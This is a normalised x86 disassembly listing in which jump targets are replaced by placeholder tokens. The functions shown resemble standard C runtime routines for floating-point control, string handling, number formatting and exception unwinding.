mov [ ebp - 0x16 ] ax
jmp r-xdata
inc [ ebp - 0xe ]
and [ ebp - 0xe ] 0x0
cmp [ ebp - 0xa ] 0xffffffff
jne r-xdata
mov eax 0x7fff
cmp si ax
jb r-xdata
test [ ebp - 0x10 ] 0x1
je r-xdata
cmp [ ebp - 0x50 ] eax
je r-xdata
add edi 0xffff
test di di
jge r-xdata
test [ ebp - 0x8 ] 0x80000000
jne r-xdata
add [ ebp - 0x6c ] 0x2
sub [ ebp - 0x68 ] 0x2
dec [ ebp - 0x50 ]
cmp [ ebp - 0x50 ] 0x0
jg r-xdata
inc [ esi ]
cmp [ ebp - 0x5c ] 0x0
mov [ esi - 0x4 ] eax
je r-xdata
mov [ ebp - 0x18 ] esi
mov ax [ ebp - 0xe ]
or esi [ ebp - 0x5c ]
mov [ ebp - 0x20 ] ax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x1e ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x1a ] eax
mov [ ebp - 0x16 ] si
jmp r-xdata
xor eax eax
xor ecx ecx
cmp [ ebp - 0x5c ] ax
mov [ ebp - 0x1c ] eax
sete cl
mov [ ebp - 0x20 ] eax
dec ecx
and ecx 0x80000000
add ecx 0x7fff8000
mov [ ebp - 0x18 ] ecx
jmp r-xdata
inc [ ebp - 0xa ]
jmp r-xdata
and [ ebp - 0xa ] 0x0
mov ecx 0xffff
cmp [ ebp - 0x6 ] cx
jne r-xdata
or [ ebp - 0x10 ] 0x1
mov eax 0x8000
mov ecx eax
cmp [ ebp - 0x10 ] cx
ja r-xdata
mov eax edi
neg eax
movzx eax ax
add edi eax
test di di
jg r-xdata
mov eax [ ebp - 0xc ]
mov ecx [ ebp - 0x10 ]
shl [ ebp - 0x10 ] 0x1
mov edx eax
add eax eax
shr ecx 0x1f
or eax ecx
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x8 ]
shr edx 0x1f
add eax eax
or eax edx
add edi 0xffff
mov [ ebp - 0x8 ] eax
test di di
jg r-xdata
mov eax [ ebp - 0x6c ]
movzx ecx [ eax ]
mov eax [ ebp - 0x68 ]
movzx eax [ eax ]
mov edx [ esi - 0x4 ]
imul ecx eax
and [ ebp - 0x5c ] 0x0
lea eax [ edx + ecx ]
cmp eax edx
jb r-xdata
mov eax [ ebp - 0x44 ]
inc [ ebp - 0x6 ]
jmp r-xdata
mov [ ebp - 0x6 ] ax
inc esi
jmp r-xdata
cmp [ ebp - 0xe ] 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x10 ]
and ecx 0x1ffff
cmp ecx 0x18000
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov esi [ ebp - 0xc ]
mov edx [ ebp - 0xc ]
shr [ ebp - 0x8 ] 0x1
shl ecx 0x1f
shr esi 0x1
or esi ecx
mov ecx [ ebp - 0x10 ]
shl edx 0x1f
shr ecx 0x1
or ecx edx
dec eax
mov [ ebp - 0xc ] esi
mov [ ebp - 0x10 ] ecx
jne r-xdata
inc [ ebp - 0x54 ]
inc [ ebp - 0xe ]
and [ ebp - 0xe ] 0x0
cmp [ ebp - 0xa ] 0xffffffff
jne r-xdata
mov eax 0x7fff
cmp di ax
jb r-xdata
test [ ebp - 0x10 ] 0x1
je r-xdata
cmp [ ebp - 0x54 ] eax
je r-xdata
mov ax [ ebp - 0xe ]
or edi [ ebp - 0x48 ]
mov [ ebp - 0x20 ] ax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x1e ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x1a ] eax
mov [ ebp - 0x16 ] di
jmp r-xdata
xor eax eax
xor ecx ecx
cmp [ ebp - 0x48 ] ax
mov [ ebp - 0x1c ] eax
sete cl
mov [ ebp - 0x20 ] eax
dec ecx
and ecx 0x80000000
add ecx 0x7fff8000
mov [ ebp - 0x18 ] ecx
inc [ ebp - 0xa ]
jmp r-xdata
and [ ebp - 0xa ] 0x0
mov ecx 0xffff
cmp [ ebp - 0x6 ] cx
jne r-xdata
or [ ebp - 0x10 ] 0x1
inc [ ebp - 0x6 ]
jmp r-xdata
mov [ ebp - 0x6 ] ax
inc edi
jmp r-xdata
sub_1001c18d
xor eax eax
test bl 0x10
je r-xdata
test bl 0x8
je r-xdata
inc eax
test bl 0x4
je r-xdata
or eax 0x4
test bl 0x2
je r-xdata
or eax 0x8
test bl 0x1
je r-xdata
or eax 0x10
test ebx 0x80000
je r-xdata
or eax 0x20
mov ecx ebx
mov edx 0x300
and ecx edx
push esi
mov esi 0x200
je r-xdata
or eax 0x2
mov ecx ebx
and ecx 0x30000
je r-xdata
cmp ecx 0x100
je r-xdata
or eax edx
cmp ecx 0x10000
jne r-xdata
or eax 0x400
cmp ecx esi
je r-xdata
retn
or eax 0x1000
pop esi
test ebx 0x40000
je r-xdata
or eax esi
jmp r-xdata
or eax 0x800
jmp r-xdata
cmp ecx edx
jne r-xdata
or eax 0xc00
jmp r-xdata
sub_1001c21b
xor eax eax
test dl 0x10
je r-xdata
push ebx
push esi
push edi
mov ebx 0x200
test dl 0x8
je r-xdata
mov eax 0x80
test dl 0x4
je r-xdata
or eax ebx
test dl 0x2
je r-xdata
or eax 0x400
test dl 0x1
je r-xdata
or eax 0x800
mov edi 0x100
test edx 0x80000
je r-xdata
or eax 0x1000
mov ecx edx
mov esi 0x300
and ecx esi
je r-xdata
or eax edi
mov ecx 0x3000000
pop edi
and edx ecx
pop esi
pop ebx
cmp edx 0x1000000
je r-xdata
cmp ecx edi
je r-xdata
or eax 0x8040
cmp edx 0x2000000
je r-xdata
or eax 0x2000
cmp ecx ebx
je r-xdata
or eax 0x40
retn
cmp edx ecx
jne r-xdata
or eax 0x4000
jmp r-xdata
cmp ecx esi
jne r-xdata
retn
or eax 0x8000
retn
or eax 0x6000
jmp r-xdata
sub_1001c2bb
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
push ebx
push esi
push edi
fwait
fnstcw [ ebp - 0x8 ]
mov ebx [ ebp - 0x8 ]
xor edx edx
test bl 0x1
je r-xdata
test bl 0x4
je r-xdata
push 0x10
pop edx
test bl 0x8
je r-xdata
or edx 0x8
test bl 0x10
je r-xdata
or edx 0x4
test bl 0x20
je r-xdata
or edx 0x2
test bl 0x2
je r-xdata
or edx 0x1
movzx ecx bx
mov eax ecx
mov esi 0xc00
and eax esi
mov edi 0x300
je r-xdata
or edx 0x80000
and ecx edi
je r-xdata
cmp eax 0x400
je r-xdata
or edx 0x20000
cmp ecx 0x200
jne r-xdata
or edx 0x100
cmp eax 0x800
je r-xdata
mov edi [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
mov eax edi
not eax
and eax edx
and ecx edi
or eax ecx
mov [ ebp + 0xc ] eax
cmp eax edx
je r-xdata
or edx 0x40000
test ebx 0x1000
je r-xdata
or edx 0x10000
jmp r-xdata
or edx 0x200
jmp r-xdata
cmp eax esi
jne r-xdata
xor esi esi
cmp [ rw-data ] esi
je r-xdata
mov ebx eax
call sub_1001c18d
movzx eax ax
mov [ ebp - 0x4 ] eax
fldcw [ ebp - 0x4 ]
fwait
fnstcw [ ebp - 0x4 ]
mov ebx [ ebp - 0x4 ]
xor edx edx
test bl 0x1
je r-xdata
or edx edi
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
and edi 0x308031f
mov [ ebp - 0x14 ] edi
stmxcsr [ ebp - 0x10 ]
mov eax [ ebp - 0x10 ]
test al al
jns r-xdata
test bl 0x4
je r-xdata
push 0x10
pop edx
test eax 0x200
je r-xdata
push 0x10
pop esi
test bl 0x8
je r-xdata
or edx 0x8
test eax 0x400
je r-xdata
or esi 0x8
test bl 0x10
je r-xdata
or edx 0x4
test eax 0x800
je r-xdata
or esi 0x4
test bl 0x20
je r-xdata
or edx 0x2
test eax 0x1000
je r-xdata
or esi 0x2
test bl 0x2
je r-xdata
or edx 0x1
test eax 0x100
je r-xdata
or esi 0x1
movzx ecx bx
mov eax ecx
and eax esi
je r-xdata
or edx 0x80000
mov ecx eax
mov ebx 0x6000
and ecx ebx
je r-xdata
or esi 0x80000
and ecx 0x300
je r-xdata
cmp eax 0x400
je r-xdata
mov edi 0x8040
and eax edi
sub eax 0x40
je r-xdata
cmp ecx 0x2000
je r-xdata
or edx 0x20000
cmp ecx 0x200
jne r-xdata
or edx 0x100
cmp eax 0x800
je r-xdata
or esi 0x2000000
sub eax 0x7fc0
je r-xdata
or esi 0x100
cmp ecx 0x4000
je r-xdata
mov [ ebp + 0xc ] edx
mov eax edx
or edx 0x40000
test ebx 0x1000
je r-xdata
or edx 0x10000
jmp r-xdata
or edx 0x200
jmp r-xdata
cmp eax esi
jne r-xdata
call sub_1001c21b
push eax
mov [ ebp - 0xc ] eax
call sub_1001c5ca
pop ecx
stmxcsr [ ebp - 0xc ]
mov ecx [ ebp - 0xc ]
xor edx edx
test cl cl
jns r-xdata
mov eax esi
jmp r-xdata
or esi 0x3000000
jmp r-xdata
sub eax 0x40
jne r-xdata
or esi 0x200
jmp r-xdata
cmp ecx ebx
jne r-xdata
or edx 0x300
jmp r-xdata
test ecx 0x200
je r-xdata
push 0x10
pop edx
mov ecx eax
xor ecx [ ebp + 0xc ]
or eax [ ebp + 0xc ]
test ecx 0x8031f
je r-xdata
mov eax [ ebp - 0x14 ]
mov edx eax
and eax [ ebp + 0x8 ]
not edx
and edx esi
or edx eax
cmp edx esi
jne r-xdata
or esi 0x1000000
jmp r-xdata
or esi 0x300
jmp r-xdata
test ecx 0x400
je r-xdata
or edx 0x8
or eax 0x80000000
test ecx 0x800
je r-xdata
or edx 0x4
test ecx 0x1000
je r-xdata
or edx 0x2
mov esi 0x100
test esi ecx
je r-xdata
or edx 0x1
mov eax ecx
and eax ebx
je r-xdata
or edx 0x80000
and ecx edi
sub ecx 0x40
je r-xdata
cmp eax 0x2000
je r-xdata
or edx 0x2000000
sub ecx 0x7fc0
je r-xdata
or edx esi
cmp eax 0x4000
je r-xdata
or edx 0x3000000
jmp r-xdata
sub ecx 0x40
jne r-xdata
or edx 0x200
jmp r-xdata
cmp eax ebx
jne r-xdata
mov eax edx
or edx 0x1000000
jmp r-xdata
or edx 0x300
jmp r-xdata
sub_1001c5ca
push 0x8
push r--data
call sub_1000ed24
xor eax eax
cmp [ rw-data ] eax
je r-xdata
call sub_1000ed69
retn
test [ ebp + 0x8 ] 0x40
je r-xdata
and [ ebp + 0x8 ] 0xffffffbf
ldmxcsr [ ebp + 0x8 ]
cmp [ rw-data ] eax
je r-xdata
mov [ ebp - 0x4 ] eax
ldmxcsr [ ebp + 0x8 ]
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
jmp r-xdata
sub_1001c650
xor eax eax
mov al [ esp + 0x8 ]
push ebx
mov ebx eax
shl eax 0x8
mov edx [ esp + 0x8 ]
test edx 0x3
je r-xdata
or ebx eax
push edi
mov eax ebx
shl ebx 0x10
push esi
or ebx eax
mov cl [ edx ]
add edx 0x1
cmp cl bl
je sub_1001c640
mov eax [ edx - 0x4 ]
cmp al bl
je r-xdata
and eax 0x81010100
je r-xdata
test cl cl
je r-xdata
lea eax [ edx - 0x4 ]
pop esi
pop edi
pop ebx
retn
test al al
je r-xdata
mov ecx [ edx ]
mov edi 0x7efefeff
mov eax ecx
mov esi edi
xor ecx ebx
add esi eax
add edi ecx
xor ecx 0xffffffff
xor eax 0xffffffff
xor ecx edi
xor eax esi
add edx 0x4
and ecx 0x81010100
jne r-xdata
and eax 0x1010100
jne r-xdata
pop ebx
xor eax eax
retn
test edx 0x3
jne r-xdata
pop esi
pop edi
cmp ah bl
je r-xdata
and esi 0x80000000
jne r-xdata
lea eax [ edx - 0x3 ]
pop esi
pop edi
pop ebx
retn
test ah ah
je r-xdata
shr eax 0x10
cmp al bl
je r-xdata
lea eax [ edx - 0x2 ]
pop esi
pop edi
pop ebx
retn
test al al
je r-xdata
cmp ah bl
je r-xdata
pop esi
pop edi
lea eax [ edx - 0x1 ]
pop ebx
retn
test ah ah
je r-xdata
jmp r-xdata
sub_1001c70e
push 0x44
mov eax sub_1001dc38
call sub_1001cd92
push r--data
lea ecx [ ebp - 0x28 ]
call sub_10008b20
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x28 ]
push eax
lea ecx [ ebp - 0x50 ]
call sub_10002520
push r--data
lea eax [ ebp - 0x50 ]
push eax
call sub_10011014
int3
sub_1001c746
push 0x44
mov eax sub_1001dc38
call sub_1001cd92
push r--data
lea ecx [ ebp - 0x28 ]
call sub_10008b20
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x28 ]
push eax
lea ecx [ ebp - 0x50 ]
call sub_10002540
push r--data
lea eax [ ebp - 0x50 ]
push eax
call sub_10011014
int3
sub_1001c7ae
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0xc ] 0x0
je r-xdata
push esi
mov esi ecx
mov [ ecx ] 0x2d
inc ecx
neg eax
add dl 0x30
add dl 0x57
jmp r-xdata
xor edx edx
div [ ebp + 0x8 ]
cmp edx 0x9
jbe r-xdata
mov [ ecx ] 0x0
dec ecx
mov [ ecx ] dl
inc ecx
test eax eax
ja r-xdata
mov dl [ esi ]
mov al [ ecx ]
mov [ ecx ] dl
dec ecx
mov [ esi ] al
inc esi
cmp esi ecx
jb r-xdata
pop esi
pop ebp
retn 0x8
sub_1001c7f2
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x10 ] 0xa
mov eax [ ebp + 0x8 ]
jne r-xdata
push 0x0
push [ ebp + 0x10 ]
test eax eax
jge r-xdata
push 0x1
push 0xa
jmp r-xdata
mov ecx [ ebp + 0xc ]
call sub_1001c7ae
mov eax [ ebp + 0xc ]
pop ebp
retn
sub_1001c81c
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
xor esi esi
xor eax eax
push edi
cmp [ ebp + 0x10 ] esi
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov ebx [ ebp + 0x8 ]
cmp ebx esi
jne r-xdata
mov edi [ ebp + 0xc ]
cmp edi esi
je r-xdata
call sub_1000ecdb
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_1000d8e6
add esp 0x14
mov eax 0x7fffffff
jmp r-xdata
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_1000d1a7
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] esi
jne r-xdata
lea eax [ ebp - 0x10 ]
push eax
movzx eax [ ebx ]
push eax
call sub_1001cdfb
movzx esi ax
lea eax [ ebp - 0x10 ]
push eax
movzx eax [ edi ]
push eax
call sub_1001cdfb
add esp 0x10
inc ebx
inc ebx
inc edi
inc edi
dec [ ebp + 0x10 ]
movzx eax ax
je r-xdata
movzx eax [ ebx ]
cmp ax 0x41
jb r-xdata
movzx ecx ax
movzx eax si
sub eax ecx
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test si si
je r-xdata
movzx esi ax
movzx eax [ edi ]
cmp ax 0x41
jb r-xdata
cmp ax 0x5a
ja r-xdata
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp si ax
je r-xdata
inc ebx
inc ebx
inc edi
inc edi
dec [ ebp + 0x10 ]
movzx eax ax
je r-xdata
cmp ax 0x5a
ja r-xdata
add eax 0x20
test si si
je r-xdata
add eax 0x20
cmp si ax
je r-xdata
jmp r-xdata
sub_1001c906
mov edi edi
push ebp
mov ebp esp
push esi
xor esi esi
push edi
cmp [ rw-data ] esi
jne r-xdata
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1001c81c
add esp 0x10
xor eax eax
cmp [ ebp + 0x10 ] esi
je r-xdata
pop edi
pop esi
pop ebp
retn
mov edi [ ebp + 0x8 ]
cmp edi esi
jne r-xdata
mov edx [ ebp + 0xc ]
cmp edx esi
je r-xdata
call sub_1000ecdb
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_1000d8e6
add esp 0x14
mov eax 0x7fffffff
jmp r-xdata
movzx eax [ edi ]
cmp ax 0x41
jb r-xdata
movzx ecx ax
movzx eax [ edx ]
cmp ax 0x41
jb r-xdata
cmp ax 0x5a
ja r-xdata
inc edi
inc edi
inc edx
inc edx
dec [ ebp + 0x10 ]
movzx eax ax
je r-xdata
cmp ax 0x5a
ja r-xdata
add eax 0x20
movzx edx ax
movzx eax cx
sub eax edx
jmp r-xdata
cmp cx si
je r-xdata
add eax 0x20
cmp cx ax
je r-xdata
sub_1001c9ac
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
mov eax [ ebp + 0xc ]
add eax 0xc
mov [ ebp - 0x4 ] eax
mov ebx [ fs : 0x0 ]
mov eax [ ebx ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov ebx [ ebp + 0xc ]
mov ebp [ ebp - 0x4 ]
mov esp [ ebx - 0x4 ]
jmp eax
sub_1001c9e5
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
push edi
mov esi [ fs : 0x0 ]
mov [ ebp - 0x4 ] esi
mov [ ebp - 0x8 ] r-xdata
push 0x0
push [ ebp + 0xc ]
push [ ebp - 0x8 ]
push [ ebp + 0x8 ]
call RtlUnwind
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
and eax 0xfffffffd
mov ecx [ ebp + 0xc ]
mov [ ecx + 0x4 ] eax
mov edi [ fs : 0x0 ]
mov ebx [ ebp - 0x4 ]
mov [ ebx ] edi
mov [ fs : 0x0 ] ebx
pop edi
pop esi
pop ebx
leave
retn 0x8
sub_1001ca39
push ebp
mov ebp esp
sub esp 0x8
push ebx
push esi
push edi
cld
mov [ ebp - 0x4 ] eax
xor eax eax
push eax
push eax
push eax
push [ ebp - 0x4 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1001da83
add esp 0x20
mov [ ebp - 0x8 ] eax
pop edi
pop esi
pop ebx
mov eax [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn
sub_1001ca6f
mov edi edi
push ebp
mov ebp esp
push esi
cld
mov esi [ ebp + 0xc ]
mov ecx [ esi + 0x8 ]
xor ecx esi
call sub_1000c0a5
push 0x0
push esi
push [ esi + 0x14 ]
push [ esi + 0xc ]
push 0x0
push [ ebp + 0x10 ]
push [ esi + 0x10 ]
push [ ebp + 0x8 ]
call sub_1001da83
add esp 0x20
pop esi
pop ebp
retn
sub_1001caa2
mov edi edi
push ebp
mov ebp esp
sub esp 0x38
push ebx
cmp [ ebp + 0x8 ] 0x123
jne r-xdata
and [ ebp - 0x28 ] 0x0
mov [ ebp - 0x24 ] sub_1001cb79
mov eax [ rw-data ]
lea ecx [ ebp - 0x28 ]
xor eax ecx
mov [ ebp - 0x20 ] eax
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0x1c ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0x20 ]
mov [ ebp - 0x10 ] eax
and [ ebp - 0xc ] 0x0
and [ ebp - 0x8 ] 0x0
and [ ebp - 0x4 ] 0x0
mov [ ebp - 0xc ] esp
mov [ ebp - 0x8 ] ebp
mov eax [ fs : 0x0 ]
mov [ ebp - 0x28 ] eax
lea eax [ ebp - 0x28 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x38 ] 0x1
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x34 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x30 ] eax
call sub_10013ee4
mov eax [ eax + 0x80 ]
mov [ ebp - 0x2c ] eax
lea eax [ ebp - 0x34 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax ]
call [ ebp - 0x2c ]
pop ecx
pop ecx
and [ ebp - 0x38 ] 0x0
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax r-xdata
mov ecx [ ebp + 0xc ]
mov [ ecx ] eax
xor eax eax
inc eax
jmp r-xdata
mov eax [ ebp - 0x28 ]
mov [ fs : 0x0 ] eax
mov ebx [ fs : 0x0 ]
mov eax [ ebx ]
mov ebx [ ebp - 0x28 ]
mov [ ebx ] eax
mov [ fs : 0x0 ] ebx
jmp r-xdata
pop ebx
leave
retn
mov eax [ ebp - 0x38 ]
sub_1001cb79
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
cld
mov eax [ ebp + 0xc ]
mov ecx [ eax + 0x8 ]
xor ecx [ ebp + 0xc ]
call sub_1000c0a5
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
and eax 0x66
je r-xdata
push 0x1
mov eax [ ebp + 0xc ]
push [ eax + 0x18 ]
mov eax [ ebp + 0xc ]
push [ eax + 0x14 ]
mov eax [ ebp + 0xc ]
push [ eax + 0xc ]
push 0x0
push [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
push [ eax + 0x10 ]
push [ ebp + 0x8 ]
call sub_1001da83
add esp 0x20
mov eax [ ebp + 0xc ]
cmp [ eax + 0x24 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
mov [ eax + 0x24 ] 0x1
xor eax eax
inc eax
jmp r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
lea eax [ ebp - 0x4 ]
push eax
push 0x123
call sub_1001caa2
add esp 0x1c
mov eax [ ebp - 0x4 ]
mov ebx [ ebp + 0xc ]
mov esp [ ebx + 0x1c ]
mov ebp [ ebx + 0x20 ]
jmp eax
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_1001c9e5
pop ebx
leave
retn
sub_1001cc18
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
mov eax [ edi + 0x10 ]
mov esi [ edi + 0xc ]
mov [ ebp - 0x4 ] eax
mov ebx esi
jmp r-xdata
mov [ ebp + 0x8 ] esi
cmp esi 0xffffffff
jne r-xdata
mov eax [ ebp + 0x14 ]
inc esi
mov [ eax ] esi
mov eax [ ebp + 0x18 ]
mov [ eax ] ebx
cmp ebx [ edi + 0xc ]
ja r-xdata
mov ecx [ ebp - 0x4 ]
dec esi
mov eax esi
imul eax eax 0x14
add eax ecx
mov ecx [ ebp + 0x10 ]
cmp [ eax + 0x4 ] ecx
jge r-xdata
call sub_10018241
call sub_10018241
cmp esi ebx
jbe r-xdata
cmp esi 0xffffffff
jne r-xdata
cmp ecx [ eax + 0x8 ]
jle r-xdata
mov eax esi
imul eax eax 0x14
add eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
leave
retn
cmp [ ebp + 0xc ] 0x0
jge r-xdata
dec [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
sub_1001cc8d
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
mov [ esi ] eax
call sub_10013ee4
mov eax [ eax + 0x98 ]
mov [ esi + 0x4 ] eax
call sub_10013ee4
mov [ eax + 0x98 ] esi
mov eax esi
pop esi
pop ebp
retn
sub_1001ccb9
mov edi edi
push ebp
mov ebp esp
call sub_10013ee4
mov eax [ eax + 0x98 ]
jmp r-xdata
test eax eax
jne r-xdata
mov ecx [ eax ]
cmp ecx [ ebp + 0x8 ]
je r-xdata
inc eax
pop ebp
retn
xor eax eax
pop ebp
retn
mov eax [ eax + 0x4 ]
sub_1001cce0
mov edi edi
push ebp
mov ebp esp
push esi
call sub_10013ee4
mov esi [ ebp + 0x8 ]
cmp esi [ eax + 0x98 ]
jne r-xdata
call sub_10013ee4
mov eax [ eax + 0x98 ]
jmp r-xdata
call sub_10013ee4
mov ecx [ esi + 0x4 ]
mov [ eax + 0x98 ] ecx
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov ecx [ eax + 0x4 ]
cmp esi ecx
je r-xdata
pop esi
pop ebp
jmp sub_10018241
mov ecx [ esi + 0x4 ]
mov [ eax + 0x4 ] ecx
jmp r-xdata
mov eax ecx
pop esi
pop ebp
retn
sub_1001cd32
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
mov eax [ rw-data ]
and [ ebp - 0x18 ] 0x0
lea ecx [ ebp - 0x18 ]
xor eax ecx
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x14 ]
inc eax
mov [ ebp - 0x14 ] sub_1001ca6f
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
mov eax [ fs : 0x0 ]
mov [ ebp - 0x18 ] eax
lea eax [ ebp - 0x18 ]
mov [ fs : 0x0 ] eax
push [ ebp + 0x18 ]
push ecx
push [ ebp + 0x10 ]
call sub_1001db70
mov ecx eax
mov eax [ ebp - 0x18 ]
mov [ fs : 0x0 ] eax
mov eax ecx
leave
retn
sub_1001cd92
push eax
push [ fs : 0x0 ]
lea eax [ esp + 0xc ]
sub esp [ esp + 0xc ]
push ebx
push esi
push edi
mov [ eax ] ebp
mov ebp eax
mov eax [ rw-data ]
xor eax ebp
push eax
push [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
retn
sub_1001cdc5
push eax
push [ fs : 0x0 ]
lea eax [ esp + 0xc ]
sub esp [ esp + 0xc ]
push ebx
push esi
push edi
mov [ eax ] ebp
mov ebp eax
mov eax [ rw-data ]
xor eax ebp
push eax
mov [ ebp - 0x10 ] esp
push [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
retn
sub_1001cdfb
mov edi edi
push ebp
mov ebp esp
mov eax 0xffff
mov ecx eax
sub esp 0x14
cmp [ ebp + 0x8 ] cx
je r-xdata
leave
retn
push ebx
push [ ebp + 0xc ]
lea ecx [ ebp - 0x14 ]
call sub_1000d1a7
mov ecx [ ebp - 0x14 ]
mov edx [ ecx + 0x14 ]
xor ebx ebx
cmp edx ebx
jne r-xdata
push esi
mov eax 0x100
mov esi eax
cmp [ ebp + 0x8 ] si
pop esi
jae r-xdata
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x41 ]
cmp cx 0x19
ja r-xdata
push [ ecx + 0x4 ]
lea ecx [ ebp - 0x4 ]
push 0x1
push ecx
push 0x1
lea ecx [ ebp + 0x8 ]
push ecx
push eax
push edx
lea eax [ ebp - 0x14 ]
push eax
call sub_1001dbbc
add esp 0x20
test eax eax
movzx eax [ ebp + 0x8 ]
je r-xdata
lea eax [ ebp - 0x14 ]
push eax
push 0x1
push [ ebp + 0x8 ]
call sub_1001af52
add esp 0xc
test eax eax
movzx eax [ ebp + 0x8 ]
je r-xdata
movzx eax ax
jmp r-xdata
add eax 0x20
cmp [ ebp - 0x8 ] bl
je r-xdata
movzx eax [ ebp - 0x4 ]
mov ecx [ ebp - 0x14 ]
mov ecx [ ecx + 0xcc ]
movzx ax [ ecx + eax ]
jmp r-xdata
pop ebx
mov ecx [ ebp - 0xc ]
and [ ecx + 0x70 ] 0xfffffffd
sub_1001ceb0
mov edi edi
push ebp
mov ebp esp
push esi
lea eax [ ebp + 0x8 ]
push eax
mov esi ecx
call sub_1000d38f
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_1001ced9
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_1000d45c
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_1000c4b4
pop ecx
sub_1001cf00
mov edi edi
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
xor eax eax
inc eax
lea edx [ eax + 0x8 ]
cmp [ edx ] 0x0
je r-xdata
mov esi [ ebp + 0xc ]
mov ecx [ esi + 0x4 ]
cmp eax ecx
je r-xdata
test [ esi ] 0x2
je r-xdata
add ecx 0x8
push ecx
push edx
call sub_10013150
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ebp + 0x10 ]
mov eax [ eax ]
test al 0x1
je r-xdata
test [ edi ] 0x8
je r-xdata
xor eax eax
jmp r-xdata
test al 0x2
je r-xdata
test [ edi ] 0x1
je r-xdata
pop edi
pop esi
pop ebp
retn
test [ edi ] 0x2
je r-xdata
sub_1001cf5f
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov eax [ eax ]
cmp eax 0xe0434f4d
je r-xdata
call sub_10013ee4
cmp [ eax + 0x90 ] 0x0
jle r-xdata
cmp eax 0xe06d7363
jne r-xdata
xor eax eax
pop ebp
retn
call sub_10013ee4
add eax 0x90
dec [ eax ]
call sub_10013ee4
and [ eax + 0x90 ] 0x0
jmp sub_100181f5
sub_1001cfa8
push 0x10
push r--data
call sub_1000ed24
mov edi [ ebp + 0x10 ]
mov ebx [ ebp + 0x8 ]
cmp [ edi + 0x4 ] 0x80
jg r-xdata
mov esi [ ebx + 0x8 ]
movsx esi [ ebx + 0x8 ]
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1001d06e
cmp esi [ ebp + 0x14 ]
je r-xdata
cmp esi 0xffffffff
jle r-xdata
mov [ ebp - 0x1c ] esi
call sub_10013ee4
add eax 0x90
inc [ eax ]
and [ ebp - 0x4 ] 0x0
mov [ ebx + 0x8 ] esi
call sub_1000ed69
retn
call sub_10018241
call sub_10018241
cmp esi [ edi + 0x4 ]
jl r-xdata
mov eax esi
shl eax 0x3
mov ecx [ edi + 0x8 ]
add ecx eax
mov esi [ ecx ]
